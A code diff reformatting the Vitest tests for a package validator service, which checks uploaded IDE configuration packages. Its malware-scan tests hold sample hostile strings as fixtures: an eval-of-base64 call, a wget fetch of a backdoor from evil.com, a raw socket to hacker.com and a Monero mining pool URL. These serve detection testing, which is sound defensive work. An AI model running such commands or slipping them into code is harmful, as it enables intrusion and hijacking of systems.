@@ -36,13 +36,13 @@ describe('PackageValidatorService', () => {
 
       // Mock tar.list to simulate valid package structure
       vi.mocked(tar.list).mockImplementation((options: any) => {
-        const {onentry} = options;
+        const { onentry } = options;
         // Return a mock stream that implements the required methods
         const mockStream = {
           on: (event: string, handler: any) => {
             if (event === 'finish') {
               // Simulate entries being processed
-              mockEntries.forEach(entry => onentry(entry));
+              mockEntries.forEach((entry) => onentry(entry));
               // Call finish handler after processing
               setTimeout(() => handler(), 0);
             }
@@ -73,11 +73,11 @@ describe('PackageValidatorService', () => {
       ];
 
       vi.mocked(tar.list).mockImplementation((options: any) => {
-        const {onentry} = options;
+        const { onentry } = options;
         const mockStream = {
           on: (event: string, handler: any) => {
             if (event === 'finish') {
-              mockEntries.forEach(entry => onentry(entry));
+              mockEntries.forEach((entry) => onentry(entry));
               setTimeout(() => handler(), 0);
             }
             return mockStream;
@@ -97,14 +97,14 @@ describe('PackageValidatorService', () => {
 
     it('should reject empty packages', async () => {
       const mockBuffer = Buffer.from('');
-      
+
       const result = await service.validateStructure(mockBuffer);
       expect(result).toBe(false);
     });
 
     it('should handle tar extraction errors gracefully', async () => {
       const mockBuffer = Buffer.from('corrupted package');
-      
+
       vi.mocked(tar.list).mockImplementation(() => {
         const mockStream = {
           on: (event: string, handler: any) => {
@@ -138,11 +138,11 @@ describe('PackageValidatorService', () => {
       ];
 
       vi.mocked(tar.list).mockImplementation((options: any) => {
-        const {onentry} = options;
+        const { onentry } = options;
         const mockStream = {
           on: (event: string, handler: any) => {
             if (event === 'finish') {
-              mockEntries.forEach(entry => onentry(entry));
+              mockEntries.forEach((entry) => onentry(entry));
               setTimeout(() => handler(), 0);
             }
             return mockStream;
@@ -194,7 +194,10 @@ describe('PackageValidatorService', () => {
   describe('calculateChecksum', () => {
     it('should calculate SHA256 checksum correctly', async () => {
       const buffer = Buffer.from('test content');
-      const expectedHash = crypto.createHash('sha256').update(buffer).digest('hex');
+      const expectedHash = crypto
+        .createHash('sha256')
+        .update(buffer)
+        .digest('hex');
 
       const result = await service.calculateChecksum(buffer);
       expect(result).toBe(expectedHash);
@@ -250,24 +253,30 @@ describe('PackageValidatorService', () => {
   describe('validatePlatform', () => {
     it('should accept valid platforms', async () => {
       const validPlatforms = ['claude-code', 'kiro-ide', 'cursor-ide'];
-      
-      /* eslint-disable no-await-in-loop */
-      for (const platform of validPlatforms) {
-        const result = await service.validatePlatform(platform);
+
+      const results = await Promise.all(
+        validPlatforms.map(async (platform) =>
+          service.validatePlatform(platform),
+        ),
+      );
+
+      results.forEach((result) => {
         expect(result).toBe(true);
-      }
-      /* eslint-enable no-await-in-loop */
+      });
     });
 
     it('should reject invalid platforms', async () => {
       const invalidPlatforms = ['invalid-ide', 'unknown', '', 'CLAUDE-CODE'];
-      
-      /* eslint-disable no-await-in-loop */
-      for (const platform of invalidPlatforms) {
-        const result = await service.validatePlatform(platform);
+
+      const results = await Promise.all(
+        invalidPlatforms.map(async (platform) =>
+          service.validatePlatform(platform),
+        ),
+      );
+
+      results.forEach((result) => {
         expect(result).toBe(false);
-      }
-      /* eslint-enable no-await-in-loop */
+      });
     });
   });
 
@@ -280,21 +289,26 @@ describe('PackageValidatorService', () => {
         Buffer.from('eval(atob("malicious_base64"))'),
       ];
 
-      /* eslint-disable no-await-in-loop */
-      for (const buffer of suspiciousPatterns) {
-        const result = await service.scanForMalware(buffer);
+      const results = await Promise.all(
+        suspiciousPatterns.map(async (buffer) =>
+          service.scanForMalware(buffer),
+        ),
+      );
+
+      results.forEach((result) => {
         expect(result).toBe(false);
-      }
-      /* eslint-enable no-await-in-loop */
+      });
     });
 
     it('should pass clean content', async () => {
-      const cleanContent = Buffer.from(JSON.stringify({
-        settings: {
-          theme: 'dark',
-          fontSize: 14,
-        }
-      }));
+      const cleanContent = Buffer.from(
+        JSON.stringify({
+          settings: {
+            theme: 'dark',
+            fontSize: 14,
+          },
+        }),
+      );
 
       const result = await service.scanForMalware(cleanContent);
       expect(result).toBe(true);
@@ -307,12 +321,13 @@ describe('PackageValidatorService', () => {
         Buffer.from('system("wget http://evil.com/backdoor")'),
       ];
 
-      /* eslint-disable no-await-in-loop */
-      for (const buffer of injectionPatterns) {
-        const result = await service.scanForMalware(buffer);
+      const results = await Promise.all(
+        injectionPatterns.map(async (buffer) => service.scanForMalware(buffer)),
+      );
+
+      results.forEach((result) => {
         expect(result).toBe(false);
-      }
-      /* eslint-enable no-await-in-loop */
+      });
     });
 
     it('should detect suspicious network patterns', async () => {
@@ -322,12 +337,13 @@ describe('PackageValidatorService', () => {
         Buffer.from('require("net").connect(1337, "hacker.com")'),
       ];
 
-      /* eslint-disable no-await-in-loop */
-      for (const buffer of networkPatterns) {
-        const result = await service.scanForMalware(buffer);
+      const results = await Promise.all(
+        networkPatterns.map(async (buffer) => service.scanForMalware(buffer)),
+      );
+
+      results.forEach((result) => {
         expect(result).toBe(false);
-      }
-      /* eslint-enable no-await-in-loop */
+      });
     });
 
     it('should handle empty buffer', async () => {
@@ -342,12 +358,13 @@ describe('PackageValidatorService', () => {
         Buffer.from('stratum+tcp://pool.minexmr.com'),
       ];
 
-      /* eslint-disable no-await-in-loop */
-      for (const buffer of miningPatterns) {
-        const result = await service.scanForMalware(buffer);
+      const results = await Promise.all(
+        miningPatterns.map(async (buffer) => service.scanForMalware(buffer)),
+      );
+
+      results.forEach((result) => {
         expect(result).toBe(false);
-      }
-      /* eslint-enable no-await-in-loop */
+      });
     });
   });
 
@@ -364,8 +381,12 @@ describe('PackageValidatorService', () => {
       vi.spyOn(service, 'validateStructure').mockResolvedValue(true);
       vi.spyOn(service, 'scanForMalware').mockResolvedValue(true);
 
-      const result = await service.validatePackage(mockBuffer, mockMetadata, 'free');
-      
+      const result = await service.validatePackage(
+        mockBuffer,
+        mockMetadata,
+        'free',
+      );
+
       expect(result.isValid).toBe(true);
       expect(result.errors).toHaveLength(0);
     });
@@ -381,14 +402,18 @@ describe('PackageValidatorService', () => {
       vi.spyOn(service, 'validateStructure').mockResolvedValue(false);
       vi.spyOn(service, 'scanForMalware').mockResolvedValue(false);
 
-      const result = await service.validatePackage(mockBuffer, mockMetadata, 'free');
-      
+      const result = await service.validatePackage(
+        mockBuffer,
+        mockMetadata,
+        'free',
+      );
+
       expect(result.isValid).toBe(false);
       expect(result.errors.length).toBeGreaterThan(0);
-      expect(result.errors.some(e => e.includes('structure'))).toBe(true);
-      expect(result.errors.some(e => e.includes('size'))).toBe(true);
-      expect(result.errors.some(e => e.includes('platform'))).toBe(true);
-      expect(result.errors.some(e => e.includes('malware'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('structure'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('size'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('platform'))).toBe(true);
+      expect(result.errors.some((e) => e.includes('malware'))).toBe(true);
     });
   });
 });
